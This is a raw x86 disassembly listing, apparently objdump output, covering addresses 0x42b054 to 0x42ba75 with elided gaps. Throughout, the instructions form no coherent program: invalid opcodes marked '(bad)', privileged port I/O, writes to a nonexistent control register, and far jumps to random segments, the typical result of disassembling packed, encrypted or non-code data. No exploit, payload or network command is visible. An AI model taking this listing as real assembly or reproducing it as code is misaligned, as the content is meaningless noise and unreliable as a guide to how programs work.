  42b054:	test   edi,0xb0f527b0
  42b05a:	xor    edi,esp
  42b05c:	clc    
  42b05d:	ss jo  0x42b000
  42b060:	ja     0x42b0ac
  42b062:	sbb    bl,0x15
  42b065:	mov    eax,ds:0x98deb176
  42b06a:	sbb    eax,0x51d2cfa1
  42b06f:	xor    edx,ebp
  42b071:	repz fcmovne st,st(6)
  42b074:	je     0x42b067
  42b076:	sbb    eax,0x7eb26086
  42b07b:	loope  0x42b035
  42b07d:	ins    BYTE PTR es:[edi],dx
  42b07e:	imul   eax,DWORD PTR ss:[edi+0x1d],0x311936a5
  42b086:	loope  0x42b08d
  42b088:	or     DWORD PTR [ebx-0x4],edx
  42b08b:	sar    eax,cl
  42b08d:	push   ebp
  42b08e:	add    al,BYTE PTR [ecx+0x69f9a7b9]
  42b094:	mov    ch,0x3a
  42b096:	dec    bx
  42b098:	sbb    al,0x18
  42b09a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b09b:	cmp    bh,BYTE PTR [edi-0x3c]
  42b09e:	sub    al,0xb1
  42b0a0:	fcomi  st,st(5)
  42b0a2:	stc    
  42b0a3:	inc    edi
  42b0a4:	and    bh,BYTE PTR [edi]
  42b0a6:	cs stos BYTE PTR es:[edi],al
  42b0a8:	sbb    bl,0xac
  42b0ab:	inc    eax
  42b0ac:	out    dx,al
  42b0ad:	dec    eax
  42b0ae:	xor    eax,0x8130f407
  42b0b3:	jmp    0x42b0bc
	...
  42b115:	add    BYTE PTR [ebp+0x25],dh
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x58f880ad]
  42b124:	pop    ebx
  42b125:	aam    0xae
  42b127:	int3   
  42b128:	add    DWORD PTR [eax],eax
  42b12a:	pop    es
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [eax-0x57c6c492],cl
  42b133:	(bad)  [ebx+eiz*1]
  42b136:	inc    ecx
  42b137:	les    esi,FWORD PTR [edi]
  42b139:	inc    edi
  42b13a:	mov    eax,0xf0141f7e
  42b13f:	fisubr DWORD PTR [edx-0x63]
  42b142:	cmc    
  42b143:	xchg   edi,eax
  42b144:	fst    DWORD PTR ds:0xf99bd283
  42b14a:	push   es
  42b14b:	adc    ebx,DWORD PTR [ecx+ebx*4+0x34d3020e]
  42b152:	(bad)  
  42b153:	icebp  
  42b154:	out    dx,al
  42b155:	and    al,0x6b
  42b157:	push   0xa58624f3
  42b15c:	lods   al,BYTE PTR ds:[esi]
  42b15d:	or     BYTE PTR ds:0xd4c5c753,0x6e
  42b164:	and    eax,0x3f2ceaea
  42b169:	xor    edi,ebx
  42b16b:	stos   BYTE PTR es:[edi],al
  42b16c:	or     DWORD PTR [edi-0x510c83d5],ebx
  42b172:	and    esp,DWORD PTR [ecx+0x4ee92687]
  42b178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b179:	jo     0x42b1b8
  42b17b:	lea    esp,[edx+0x2b]
  42b17e:	and    BYTE PTR [esi+0x6b133787],0x34
  42b185:	(bad)  
  42b186:	dec    edi
  42b187:	push   es
  42b188:	ds xor eax,0xf0ffebad
  42b18e:	clc    
  42b18f:	in     eax,dx
  42b190:	jae    0x42b1e7
  42b192:	cmc    
  42b193:	xchg   ebx,eax
  42b194:	or     bl,BYTE PTR [eax+0x54]
  42b197:	jmp    0x7b71:0x95b56a
  42b19e:	xlat   BYTE PTR ds:[ebx]
  42b19f:	neg    edx
  42b1a1:	mov    cr7,esp
  42b1a4:	in     al,0x2f
  42b1a6:	xchg   BYTE PTR [edi*8-0x6434e282],bl
  42b1ad:	pop    esp
  42b1ae:	sub    bl,dl
  42b1b0:	out    0x82,eax
  42b1b2:	sub    dh,BYTE PTR [edi]
  42b1b4:	fsub   QWORD PTR [ecx-0x12]
  42b1b7:	out    0xae,eax
  42b1b9:	jae    0x42b1db
  42b1bb:	sub    dl,BYTE PTR [edi+0x5b684cd5]
  42b1c1:	pushf  
  42b1c2:	xchg   esi,eax
  42b1c3:	stc    
  42b1c4:	ja     0x42b204
  42b1c6:	xor    eax,0x7197a2bf
  42b1cb:	pop    ebx
  42b1cc:	inc    ebx
  42b1cd:	into   
  42b1ce:	mov    ebp,0x7b9d77ce
  42b1d3:	sub    ah,BYTE PTR [esi+0x19f1e10a]
  42b1d9:	call   0xf873:0x1c2506cf
  42b1e0:	mov    edx,0xaf311aa2
  42b1e5:	or     al,0xa7
  42b1e7:	in     al,dx
  42b1e8:	cmp    DWORD PTR [ebx-0x1a9e48e7],ebx
  42b1ee:	xchg   ebp,eax
  42b1ef:	lods   al,BYTE PTR ds:[esi]
  42b1f0:	out    0x6e,al
  42b1f2:	sar    ch,cl
  42b1f4:	mov    BYTE PTR [edx-0x7e],dh
  42b1f7:	out    dx,al
  42b1f8:	and    ebx,DWORD PTR [edx+eax*1]
  42b1fb:	jb     0x42b259
  42b1fd:	mov    cl,0x94
  42b1ff:	mov    eax,ds:0xf44ae43a
  42b204:	sbb    al,ah
  42b206:	fisubr DWORD PTR ds:0x8051e126
  42b20c:	mov    ah,dh
  42b20e:	mov    edi,0xd23442f9
  42b213:	xchg   edi,eax
  42b214:	cld    
  42b215:	adc    dh,BYTE PTR ds:0x5510f7e7
  42b21b:	retf   0x64d8
  42b21e:	dec    esi
  42b21f:	bound  edx,QWORD PTR [edi]
  42b221:	adc    al,BYTE PTR [edx-0x5c4c87c5]
  42b227:	and    eax,0x2de11203
  42b22c:	ds jmp 0x42b257
  42b22f:	retf   0xf69b
  42b232:	dec    eax
  42b233:	data16 inc BYTE PTR [eax]
	...
  42b296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b297:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp-0x74],ch
  42b2a3:	and    DWORD PTR fs:[edx],0xffffffb5
  42b2a7:	int    0x1
  42b2a9:	add    BYTE PTR [edi],al
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    ah,dh
  42b2af:	xor    ebx,DWORD PTR [edx]
  42b2b1:	pop    eax
  42b2b2:	cdq    
  42b2b3:	lock into 
  42b2b5:	into   
  42b2b6:	pop    esp
  42b2b7:	mov    esi,0xf98439a2
  42b2bc:	fisttp DWORD PTR [edi+0x71b0c0d6]
  42b2c2:	mov    al,0x55
  42b2c4:	call   0x38e0558b
  42b2c9:	arpl   WORD PTR [ebx+0x61901feb],ax
  42b2cf:	push   0x76
  42b2d1:	cmp    BYTE PTR [ecx],ah
  42b2d3:	mov    al,ds:0x1fca2267
  42b2d8:	repz in al,dx
  42b2da:	jo     0x42b329
  42b2dc:	xor    al,0x52
  42b2de:	rcl    DWORD PTR [eax],cl
  42b2e0:	shl    esp,cl
  42b2e2:	scas   al,BYTE PTR es:[edi]
  42b2e3:	dec    edi
  42b2e4:	mov    dh,0x10
  42b2e6:	mov    ebp,0x43cbbce1
  42b2eb:	test   eax,0x83722ba0
  42b2f0:	xor    ecx,esp
  42b2f2:	sub    BYTE PTR [eax],bl
  42b2f4:	call   0x72d7:0xbb75843a
  42b2fb:	sbb    esi,DWORD PTR [ebp+0x5b]
  42b2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2ff:	mov    ch,0xde
  42b301:	std    
  42b302:	sub    al,0x6b
  42b304:	pop    ss
  42b305:	or     edx,0xd73c46b
  42b30b:	and    ah,ah
  42b30d:	sub    al,0xc6
  42b30f:	in     al,0xe6
  42b311:	test   DWORD PTR [esi-0x2b3f2f10],esi
  42b317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b318:	out    dx,eax
  42b319:	dec    ax
  42b31b:	dec    ebx
  42b31c:	sbb    edi,DWORD PTR [edx-0x5]
  42b31f:	sub    cl,BYTE PTR [ecx]
  42b321:	mov    al,ds:0x43f7b435
  42b326:	stos   BYTE PTR es:[edi],al
  42b327:	or     DWORD PTR [ebp-0x4a],0xfc790fc8
  42b32e:	sub    BYTE PTR [ecx-0x10ff1e9d],0x39
  42b335:	or     cl,BYTE PTR [ecx-0x7509ca3d]
  42b33b:	div    DWORD PTR [ebp-0x7]
  42b33e:	jne    0x42b30b
  42b340:	xor    ch,BYTE PTR [ebp-0x54]
  42b343:	in     eax,0xba
  42b345:	in     eax,dx
  42b346:	mov    ebp,0x165c5fac
  42b34b:	add    DWORD PTR [ecx],esp
  42b34d:	push   esi
  42b34e:	lods   al,BYTE PTR ds:[esi]
  42b34f:	mov    ds:0xc0e1447f,al
  42b354:	and    DWORD PTR ds:0xddd9e0a0,esp
  42b35a:	xor    bh,bh
  42b35c:	outs   dx,DWORD PTR ds:[esi]
  42b35d:	cdq    
  42b35e:	mov    ah,0xc2
  42b360:	cmp    al,0x8d
  42b362:	add    edx,DWORD PTR [eax+0x59db2d90]
  42b368:	(bad)
  42b36b:	pushf  
  42b36c:	ds dec ebp
  42b36e:	inc    edi
  42b36f:	(bad)  
  42b370:	fbld   TBYTE PTR [ebx+eax*2]
  42b373:	cmp    al,0xda
  42b375:	add    ebp,DWORD PTR [ecx-0x6d]
  42b378:	rcr    DWORD PTR [ebp-0x4d7a0016],0xd
  42b37f:	add    al,0x0
  42b381:	xor    ebx,DWORD PTR ds:0xb0dff853
  42b387:	inc    esp
  42b388:	nop
  42b389:	jl     0x42b332
  42b38b:	cmp    DWORD PTR [eax],ebp
  42b38d:	sub    eax,DWORD PTR [edi]
  42b38f:	iret   
  42b390:	popa   
  42b391:	cld    
  42b392:	pop    ebp
  42b393:	push   0xffffffbe
  42b395:	mov    ecx,0xac1ece14
  42b39a:	call   0x2f4f:0x1a6eebc1
  42b3a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3a2:	fcomp  QWORD PTR [ebx-0x78d6b5d4]
  42b3a8:	mov    edi,0xd62f3f9e
  42b3ad:	lea    ecx,[eax-0x2cb46849]
  42b3b3:	enter  0xbe,0x0
	...
  42b413:	add    BYTE PTR [eax],al
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0xb
  42b423:	sbb    eax,edi
  42b425:	jmp    0x4482e6
  42b42a:	pop    es
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    bh,dh
  42b42f:	xchg   esi,eax
  42b430:	mov    bh,0xe7
  42b432:	shl    BYTE PTR [eax],cl
  42b434:	out    0x8f,eax
  42b436:	xchg   BYTE PTR [ecx],ah
  42b438:	add    al,0x6f
  42b43a:	cmp    al,0xea
  42b43c:	mov    al,0x72
  42b43e:	jns    0x42b3d1
  42b440:	mov    ebx,0xfcb23ac7
  42b445:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42b447:	jno    0x42b3ef
  42b449:	push   esp
  42b44a:	and    al,0xd0
  42b44c:	sub    dl,0xe3
  42b44f:	inc    ebp
  42b450:	push   es
  42b451:	(bad)  
  42b452:	loopne 0x42b4ac
  42b454:	scas   al,BYTE PTR es:[edi]
  42b455:	inc    ebx
  42b456:	push   es
  42b457:	mov    al,0xe8
  42b459:	(bad)  
  42b45a:	rcr    DWORD PTR [ebx+eax*8-0x424dc8d1],cl
  42b461:	mov    esp,DWORD PTR [ecx]
  42b463:	cwde   
  42b464:	je     0x42b464
  42b466:	in     al,dx
  42b467:	jge    0x42b483
  42b469:	sub    eax,0x22c70d49
  42b46e:	jmp    FWORD PTR [ebp-0x43]
  42b471:	cmp    ch,dl
  42b473:	pop    edi
  42b474:	sahf   
  42b475:	or     dh,ch
  42b477:	push   edx
  42b478:	outs   dx,BYTE PTR ds:[esi]
  42b479:	mov    esi,0x359cbedc
  42b47e:	xor    al,0xcc
  42b480:	(bad)  
  42b482:	xor    BYTE PTR [ecx+edi*4-0x2926ce54],dl
  42b489:	iret   
  42b48a:	adc    ch,BYTE PTR [ebx]
  42b48c:	xchg   esi,eax
  42b48d:	mov    esp,0x5906c744
  42b493:	pop    eax
  42b494:	adc    ah,ch
  42b496:	fmul   DWORD PTR [edx+ecx*8+0x358f2c92]
  42b49d:	into   
  42b49e:	int    0xde
  42b4a0:	scas   eax,DWORD PTR es:[edi]
  42b4a1:	aas    
  42b4a2:	push   esi
  42b4a3:	adc    DWORD PTR [esi+eax*1],ebp
  42b4a6:	dec    eax
  42b4a7:	or     dh,0xf3
  42b4aa:	lock xor al,0xc2
  42b4ad:	pop    edi
  42b4ae:	iret   
  42b4af:	jmp    0x5bbb:0x9023659e
  42b4b6:	add    bl,bh
  42b4b8:	mov    ch,0xf6
  42b4ba:	mov    eax,0xc4240378
  42b4bf:	ficomp WORD PTR [edx+0x38]
  42b4c2:	and    eax,0xde796db4
  42b4c7:	adc    esp,DWORD PTR [ecx-0x75]
  42b4ca:	repnz pop edx
  42b4cc:	inc    esi
  42b4cd:	cmp    bl,BYTE PTR [edx*1+0x680d62c7]
  42b4d4:	inc    esi
  42b4d5:	mov    esi,0xdfa03852
  42b4da:	mov    DWORD PTR [esi+0x25123ccd],edi
  42b4e0:	adc    dl,dl
  42b4e2:	mov    bh,0xbd
  42b4e4:	sub    ah,BYTE PTR [ebp-0xfe49e]
  42b4ea:	(bad)  
  42b4eb:	mov    dl,0xad
  42b4ed:	adc    DWORD PTR [eax],edx
  42b4ef:	push   0x7f
  42b4f1:	out    dx,al
  42b4f2:	imul   edi,DWORD PTR [ecx-0x78],0xf10f736d
  42b4f9:	in     eax,dx
  42b4fa:	ficomp DWORD PTR [eax-0x17898da6]
  42b500:	mov    BYTE PTR [ebp-0x37],bl
  42b503:	or     bl,bh
  42b505:	xchg   ebp,eax
  42b506:	dec    ebx
  42b507:	pop    edx
  42b508:	mov    ebp,0xcfb95465
  42b50d:	or     edi,DWORD PTR [edi]
  42b50f:	and    al,0xfa
  42b511:	enter  0xd345,0x29
  42b515:	sbb    edx,esp
  42b517:	cmp    DWORD PTR [ebx],ecx
  42b519:	adc    bl,ch
  42b51b:	jb     0x42b599
  42b51d:	(bad)  [ebx]
  42b51f:	or     DWORD PTR [edx+0x32764bf0],0xffffff89
  42b526:	mov    WORD PTR [ecx],cs
  42b528:	mov    esi,0xcf20131d
  42b52d:	jecxz  0x42b586
  42b52f:	dec    esp
  42b530:	mov    ds:0x41197654,eax
	...
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	xchg   edx,eax
  42b5a3:	shl    edi,cl
  42b5a5:	rol    ebx,0xcf
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR [edx-0x4f],bl
  42b5b0:	sbb    BYTE PTR [ebx],0x81
  42b5b3:	or     al,0x77
  42b5b5:	pop    ebp
  42b5b6:	scas   eax,DWORD PTR es:[edi]
  42b5b7:	xchg   esp,eax
  42b5b8:	push   eax
  42b5b9:	rcl    BYTE PTR ds:0x4fe3ca9f,0xd0
  42b5c0:	mov    dh,0x3b
  42b5c2:	jmp    0xe7da568a
  42b5c7:	push   cs
  42b5c8:	imul   edi
  42b5ca:	pop    edi
  42b5cb:	mov    ds:0x6f742090,al
  42b5d0:	or     BYTE PTR [ecx-0x74],cl
  42b5d3:	shr    BYTE PTR [esi+0x64],0xc6
  42b5d7:	cdq    
  42b5d8:	inc    esi
  42b5d9:	mov    ebp,0x78b0dde9
  42b5de:	cwde   
  42b5df:	call   0xa133:0x7656f5bd
  42b5e6:	xchg   BYTE PTR es:[ebx],ah
  42b5e9:	add    edi,DWORD PTR [edi]
  42b5eb:	loopne 0x42b61a
  42b5ed:	es nop
  42b5ef:	dec    esi
  42b5f0:	neg    BYTE PTR [edi+0x4ca9c5ac]
  42b5f6:	loop   0x42b5e6
  42b5f8:	cmp    BYTE PTR [eax+0x6ae81dce],dl
  42b5fe:	sub    DWORD PTR [eax+0x58628766],eax
  42b604:	fidivr WORD PTR [eax]
  42b606:	in     eax,dx
  42b607:	rcr    DWORD PTR [ebx+0x7f],0x83
  42b60b:	retf   0x6070
  42b60e:	aas    
  42b60f:	xchg   ecx,eax
  42b610:	repz fwait
  42b612:	(bad)  
  42b613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b614:	lods   eax,DWORD PTR ds:[esi]
  42b615:	pop    ebp
  42b616:	mov    dh,0x4d
  42b618:	mov    ebp,0x8915fcd
  42b61d:	mov    esp,0x9082d795
  42b622:	mov    bh,0x52
  42b624:	inc    ebx
  42b625:	(bad)  
  42b627:	aas    
  42b628:	or     esp,DWORD PTR [ecx+0x32]
  42b62b:	jbe    0x42b60e
  42b62d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b62e:	inc    ebp
  42b62f:	repnz das 
  42b631:	mov    ds:0xb45e2ed4,al
  42b636:	je     0x42b694
  42b638:	inc    esi
  42b639:	xlat   BYTE PTR ds:[ebx]
  42b63a:	mov    ah,0x79
  42b63c:	retf   0x1b04
  42b63f:	pop    edi
  42b640:	imul   ecx,ebx,0x5fdad2b2
  42b646:	repz sub ch,BYTE PTR [ebx-0x30]
  42b64a:	iret   
  42b64b:	or     al,0x81
  42b64d:	sub    eax,DWORD PTR [esi-0x61]
  42b650:	and    esp,DWORD PTR [edi]
  42b652:	pop    eax
  42b653:	sbb    eax,0x164d8258
  42b658:	inc    ebp
  42b659:	stos   DWORD PTR es:[edi],eax
  42b65a:	jle    0x42b60d
  42b65c:	add    DWORD PTR [edx-0x30],esi
  42b65f:	inc    esp
  42b660:	mov    al,0x22
  42b662:	push   edx
  42b663:	nop
  42b664:	cld    
  42b665:	out    dx,eax
  42b666:	repz mov dl,0x98
  42b669:	popa   
  42b66a:	fistp  QWORD PTR ds:0xd9666426
  42b670:	aam    0xc4
  42b672:	and    ah,BYTE PTR ds:0x8f3a116d
  42b678:	pop    esi
  42b679:	sahf   
  42b67a:	mov    al,BYTE PTR [edi-0x7a]
  42b67d:	jmp    0x1721eeae
  42b682:	mov    esi,esi
  42b684:	dec    ebp
  42b685:	adc    eax,0x56d0f46e
  42b68a:	jl     0x42b62c
  42b68c:	pop    ebx
  42b68d:	xlat   BYTE PTR ds:[ebx]
  42b68e:	ficomp DWORD PTR [ebx+edi*1-0x1f]
  42b692:	jno    0x42b6eb
  42b694:	push   cs
  42b695:	jo     0x42b6ca
  42b697:	sub    dh,BYTE PTR [ecx-0x5e]
  42b69a:	xor    bl,BYTE PTR [esi+0x76]
  42b69d:	jae    0x42b65c
  42b69f:	jp     0x42b6e4
  42b6a1:	sahf   
  42b6a2:	inc    ebx
  42b6a3:	cld    
  42b6a4:	popf   
  42b6a5:	imul   esp,esp,0xaaff6dda
  42b6ab:	ins    DWORD PTR es:[edi],dx
  42b6ac:	mov    WORD PTR [eax+0x5],ss
  42b6af:	lock fcmovb st,st(3)
  42b6b2:	xchg   ebx,edi
  42b6b4:	xchg   ebx,eax
	...
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp-0x6f],bl
  42b723:	fdivr  QWORD PTR ds:0x1d0ca19
  42b729:	add    BYTE PTR [edi],al
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    BYTE PTR ds:0xfc6d926e,dl
  42b733:	into   
  42b734:	adc    DWORD PTR [ebx-0x4f849a0c],edx
  42b73a:	xlat   BYTE PTR ds:[ebx]
  42b73b:	inc    eax
  42b73c:	fmul   st,st(3)
  42b73e:	enter  0xda17,0x1
  42b742:	push   0xffffffdb
  42b744:	clc    
  42b745:	lea    esi,[ecx]
  42b747:	xchg   esp,eax
  42b748:	popa   
  42b749:	push   edx
  42b74a:	pop    esp
  42b74b:	aas    
  42b74c:	aad    0x76
  42b74e:	je     0x42b7bd
  42b750:	add    ecx,DWORD PTR [ecx-0x7c627d42]
  42b756:	add    eax,0x9aee5148
  42b75b:	mul    esi
  42b75d:	lods   eax,DWORD PTR ds:[esi]
  42b75e:	mov    ah,0x25
  42b760:	add    dh,BYTE PTR [ecx+ecx*8+0x472c349e]
  42b767:	add    BYTE PTR [edx+0x33f950b7],dh
  42b76d:	inc    ebp
  42b76e:	adc    ebx,edx
  42b770:	inc    eax
  42b771:	mov    ecx,ebp
  42b773:	sbb    DWORD PTR [eax],ebp
  42b775:	push   cs
  42b776:	mov    ds:0x21af4452,al
  42b77b:	jno    0x42b757
  42b77d:	mov    ah,0x7f
  42b77f:	jb     0x42b7c0
  42b781:	shl    DWORD PTR [edi+0x7713858a],cl
  42b787:	push   ecx
  42b788:	and    ecx,DWORD PTR [ebp+0x21]
  42b78b:	jle    0x42b73f
  42b78d:	rol    DWORD PTR [ecx],0x7
  42b790:	ins    DWORD PTR es:[edi],dx
  42b791:	adc    al,0xbe
  42b793:	arpl   WORD PTR [esi],ax
  42b795:	mov    dh,0x43
  42b797:	fadd   QWORD PTR [esi+eiz*2]
  42b79a:	(bad)  
  42b79b:	rcl    DWORD PTR [edx+0xe7c4395],cl
  42b7a1:	sub    al,0xca
  42b7a3:	sub    esp,DWORD PTR [eax-0x705a8c4]
  42b7a9:	jmp    0x715:0xf8dc9383
  42b7b0:	not    DWORD PTR [ecx+ebx*4]
  42b7b3:	dec    eax
  42b7b4:	push   cs
  42b7b5:	dec    edi
  42b7b6:	xchg   esi,eax
  42b7b7:	mov    ch,0x3
  42b7b9:	jbe    0x42b785
  42b7bb:	imul   edi,DWORD PTR [ecx+0x15631fbe],0xb5c8be96
  42b7c5:	into   
  42b7c6:	mov    WORD PTR [esi+0x7efe9a1b],cs
  42b7cc:	pop    DWORD PTR [edi+eax*1-0x270c68b8]
  42b7d3:	fistp  QWORD PTR [ecx-0x76]
  42b7d6:	cmp    esi,DWORD PTR [ebx-0x2c]
  42b7d9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42b7db:	icebp  
  42b7dc:	inc    esi
  42b7dd:	repnz xor DWORD PTR [ebx+0x48cb9847],ebx
  42b7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7e5:	in     eax,0x8a
  42b7e7:	push   esp
  42b7e8:	inc    edx
  42b7e9:	into   
  42b7ea:	call   0x3955b666
  42b7ef:	jg     0x42b7c9
  42b7f1:	sbb    eax,0x906c9bc0
  42b7f6:	pop    ds
  42b7f7:	lock sub DWORD PTR [edi-0x6aee96ec],edi
  42b7fe:	and    eax,0xfefad13c
  42b803:	imul   ebp,DWORD PTR [edi+0x381892c4],0x6f1b3524
  42b80d:	stc    
  42b80e:	in     al,0x7e
  42b810:	dec    ebx
  42b811:	ds cdq 
  42b813:	xchg   ecx,eax
  42b814:	jmp    0x4c18:0x9b69eba3
  42b81b:	xor    edi,edx
  42b81d:	outs   dx,BYTE PTR ds:[esi]
  42b81e:	dec    eax
  42b81f:	add    cl,BYTE PTR ds:0x989fb7f4
  42b825:	arpl   WORD PTR [ebx-0x189369d],bp
  42b82b:	clc    
  42b82c:	outs   dx,DWORD PTR ds:[esi]
  42b82d:	or     eax,0xda10a1f1
  42b832:	jecxz  0x42b883
  42b834:	ins    DWORD PTR es:[edi],dx
	...
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi+0x142e6e46]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [eax+0x71],al
  42b8b0:	pop    ds
  42b8b1:	addr16 push edx
  42b8b3:	mov    esi,0xaad22110
  42b8b8:	daa    
  42b8b9:	out    dx,al
  42b8ba:	jae    0x42b840
  42b8bc:	cwde   
  42b8bd:	gs aam 0xe0
  42b8c0:	mov    eax,0xc03bf89a
  42b8c5:	add    DWORD PTR [ecx],0xa
  42b8c8:	cs push cs
  42b8ca:	push   ecx
  42b8cb:	loop   0x42b8a5
  42b8cd:	mov    ebp,0x920cee59
  42b8d2:	xor    DWORD PTR [ecx],esi
  42b8d4:	jns    0x42b8a3
  42b8d6:	pop    eax
  42b8d7:	mov    eax,0xe4f45c8f
  42b8dc:	(bad)  
  42b8dd:	(bad)  
  42b8de:	dec    ebx
  42b8df:	sub    al,0xbd
  42b8e1:	jmp    0xff0dba79
  42b8e6:	xchg   esi,eax
  42b8e7:	push   ecx
  42b8e8:	and    DWORD PTR [eax-0x60a5944a],0x39
  42b8ef:	or     DWORD PTR [edi],edx
  42b8f1:	lahf   
  42b8f2:	xor    al,0x1e
  42b8f4:	cmc    
  42b8f5:	rcl    BYTE PTR [ebx],cl
  42b8f7:	fs sbb bl,ch
  42b8fa:	hlt    
  42b8fb:	adc    ebp,esp
  42b8fd:	sar    DWORD PTR [edx],cl
  42b8ff:	push   edi
  42b900:	ficom  WORD PTR [edi+ebx*1]
  42b903:	push   ss
  42b904:	shl    DWORD PTR [edx-0x2544b7c1],cl
  42b90a:	es push 0xffffffbc
  42b90d:	inc    esp
  42b90e:	bound  esp,QWORD PTR [edi+0x1]
  42b911:	out    dx,eax
  42b912:	mov    ah,0x76
  42b914:	inc    eax
  42b915:	gs mov bh,0x56
  42b918:	xchg   BYTE PTR [eax-0x49be8272],ah
  42b91e:	dec    esp
  42b91f:	push   edx
  42b920:	dec    eax
  42b921:	jg     0x42b94d
  42b923:	xor    DWORD PTR [ebp+esi*8+0x2ddcf260],ebx
  42b92a:	in     al,dx
  42b92b:	stos   DWORD PTR es:[edi],eax
  42b92c:	sbb    ebx,esp
  42b92e:	test   al,0x1a
  42b930:	or     bl,BYTE PTR [edx-0x70]
  42b933:	das    
  42b934:	push   eax
  42b935:	dec    eax
  42b936:	dec    ebp
  42b937:	adc    eax,0xd4406f42
  42b93c:	add    ch,BYTE PTR [eax-0x7b673102]
  42b942:	xor    al,0xd6
  42b944:	or     DWORD PTR [edi*1+0x3b8251eb],0x7473cd7
  42b94f:	nop
  42b950:	sub    BYTE PTR [eax-0x1b],bh
  42b953:	cmc    
  42b954:	fbstp  TBYTE PTR [ebx]
  42b956:	xor    BYTE PTR [edx-0x64],0x73
  42b95a:	test   DWORD PTR [ebp+0x47],ebp
  42b95d:	jne    0x42b944
  42b95f:	js     0x42b90f
  42b961:	or     al,0x5
  42b963:	outs   dx,BYTE PTR ds:[esi]
  42b964:	push   ss
  42b965:	jae    0x42b9a0
  42b967:	aas    
  42b968:	std    
  42b969:	cmp    DWORD PTR [eax-0x4b],0x5c145f83
  42b970:	xor    DWORD PTR [ecx],edi
  42b972:	mov    al,0x3c
  42b974:	ins    DWORD PTR es:[edi],dx
  42b975:	test   eax,0xbf347f71
  42b97a:	and    eax,0x2f25ae33
  42b97f:	das    
  42b980:	out    0x5,al
  42b982:	pop    ebx
  42b983:	jle    0x42b9b4
  42b985:	retf   
  42b986:	fcom   st(4)
  42b988:	lahf   
  42b989:	in     al,dx
  42b98a:	(bad)  
  42b98c:	push   esp
  42b98d:	or     bh,ch
  42b98f:	sub    esi,DWORD PTR [esi+0x2b]
  42b992:	mov    ecx,0xebd6a621
  42b997:	(bad)  
  42b999:	data16 loope 0x42b9a9
  42b99c:	add    esi,DWORD PTR [esi+0x43]
  42b99f:	mov    eax,ds:0x6daec9a
  42b9a4:	and    BYTE PTR [eax+0x7a],ah
  42b9a7:	test   BYTE PTR [ebx+0xe],bl
  42b9aa:	jbe    0x42b9d6
  42b9ac:	xchg   edi,eax
  42b9ad:	mov    cl,0xf2
  42b9af:	pop    ebx
  42b9b0:	std    
  42b9b1:	call   0xacc771
	...
  42ba16:	mov    eax,DWORD PTR [edi]
  42ba18:	mov    al,0xe2
  42ba1a:	mov    esp,0x316fdbf7
  42ba1f:	inc    eax
  42ba20:	sbb    cl,0x5d
  42ba23:	sub    ebp,DWORD PTR [edi-0x63]
  42ba26:	fcom   st(2)
  42ba28:	add    DWORD PTR [eax],eax
  42ba2a:	pop    es
  42ba2b:	add    DWORD PTR [eax],eax
  42ba2d:	add    BYTE PTR [eax-0x7],cl
  42ba30:	popa   
  42ba31:	repz daa 
  42ba33:	xor    eax,0xcd46a7fc
  42ba38:	mov    DWORD PTR [eax],edx
  42ba3a:	bound  ebx,QWORD PTR [edx+0x72]
  42ba3d:	enter  0x801d,0x55
  42ba41:	out    dx,al
  42ba42:	lock pusha 
  42ba44:	xchg   DWORD PTR [ecx+esi*4+0x10],esp
  42ba48:	mul    DWORD PTR [edi+0x4f4108fe]
  42ba4e:	jecxz  0x42bab9
  42ba50:	outs   dx,BYTE PTR ds:[esi]
  42ba51:	pop    esi
  42ba52:	inc    ebx
  42ba53:	loope  0x42ba73
  42ba55:	scas   al,BYTE PTR es:[edi]
  42ba56:	imul   esi,DWORD PTR [eax+eax*2-0x1a],0x3971f0e8
  42ba5e:	sbb    ebx,DWORD PTR ds:0xbcc8e9ea
  42ba64:	adc    DWORD PTR [edx],esp
  42ba66:	push   ecx
  42ba67:	in     eax,dx
  42ba68:	test   DWORD PTR [edx-0x4a9e1c11],edi
  42ba6e:	xchg   edx,eax
  42ba6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba70:	jmp    0x42ba7c
  42ba72:	into   
  42ba73:	fcomp  QWORD PTR [edx]
  42ba75:	sar    DWORD PTR [eax+0x516c8542],0x75
